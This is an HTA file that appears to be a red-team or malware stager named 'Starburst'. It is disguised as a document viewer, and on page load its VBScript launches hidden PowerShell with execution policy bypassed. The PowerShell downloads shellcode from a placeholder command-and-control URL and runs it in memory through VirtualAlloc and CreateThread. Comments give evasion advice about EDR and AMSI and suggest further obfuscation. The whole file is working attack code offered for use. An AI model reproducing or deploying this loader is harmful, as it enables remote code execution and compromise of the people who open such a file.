<html>
<head>
<title>Loading Document...</title>
<!-- ======================================================================
     Starburst HTA Stager - PowerShell Download Cradle Launch
     ======================================================================
     Technique:  VBScript launches hidden PowerShell with download cradle
     OPSEC Notes:
       - mshta.exe -> powershell.exe parent-child chain is highly suspicious.
       - EDR products specifically monitor this process lineage.
       - PowerShell execution policy is bypassed via -Exec Bypass flag.
       - The PowerShell command is base64-encoded to avoid command-line
         parsing issues, but base64 powershell commands are a known indicator.
       - Consider obfuscating the PowerShell command further.
       - AMSI will inspect the decoded PowerShell command.
       - HTA runs in the context of the logged-in user.
       - Network connection from powershell.exe to payload URL is logged.
     ====================================================================== -->
<HTA:APPLICATION
    ID="StarburstPSH"
    APPLICATIONNAME="Document Viewer"
    BORDER="none"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    WINDOWSTATE="minimize"
/>
</head>
<body>
<script language="VBScript">

' --- OPERATOR: Set payload download URL ---
Dim sPayloadUrl
sPayloadUrl = "https://your-c2-server.com/starburst.bin"

Sub Window_OnLoad()
    On Error Resume Next

    ' Build the PowerShell download cradle command
    ' This downloads shellcode and executes it in memory using VirtualAlloc
    Dim sPSCommand
    sPSCommand = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
        "$w=New-Object Net.WebClient;" & _
        "$w.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)');" & _
        "$w.Proxy=[Net.WebRequest]::GetSystemWebProxy();" & _
        "$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;" & _
        "$sc=$w.DownloadData('" & sPayloadUrl & "');" & _
        "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;" & _
        "public class K{" & _
        "[DllImport(""kernel32"")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);" & _
        "[DllImport(""kernel32"")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);" & _
        "[DllImport(""kernel32"")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr r,IntPtr p,uint f,out uint i);" & _
        "[DllImport(""kernel32"")]public static extern uint WaitForSingleObject(IntPtr h,uint m);" & _
        "}';" & _
        "$a=[K]::VirtualAlloc(0,$sc.Length,0x3000,0x04);" & _
        "[Runtime.InteropServices.Marshal]::Copy($sc,0,$a,$sc.Length);" & _
        "$o=0;[K]::VirtualProtect($a,$sc.Length,0x20,[ref]$o)|Out-Null;" & _
        "$t=0;$h=[K]::CreateThread(0,0,$a,0,0,[ref]$t);" & _
        "[K]::WaitForSingleObject($h,0xFFFFFFFF)|Out-Null"

    ' Base64 encode the command for -EncodedCommand
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")

    ' Convert to UTF-16LE base64 for PowerShell -EncodedCommand
    Dim oEncoder, sEncoded
    Dim arrBytes()
    Dim i, sChar

    ' Build UTF-16LE byte stream
    Dim oStream
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 2 ' adTypeText
    oStream.Charset = "unicode"
    oStream.Open
    oStream.WriteText sPSCommand
    oStream.Position = 0
    oStream.Type = 1 ' adTypeBinary
    oStream.Position = 2 ' Skip BOM

    Dim binData
    binData = oStream.Read
    oStream.Close

    ' Base64 encode using MSXML
    Dim oXML, oNode
    Set oXML = CreateObject("MSXML2.DOMDocument.6.0")
    Set oNode = oXML.createElement("b64")
    oNode.DataType = "bin.base64"
    oNode.nodeTypedValue = binData
    sEncoded = Replace(Replace(oNode.Text, vbCr, ""), vbLf, "")

    ' Launch hidden PowerShell with encoded command
    Dim sCmd
    sCmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand " & sEncoded
    oShell.Run sCmd, 0, False

    ' Clean up
    Set oNode = Nothing
    Set oXML = Nothing
    Set oStream = Nothing
    Set oShell = Nothing

    ' Close HTA window
    window.close
End Sub

</script>
</body>
</html>
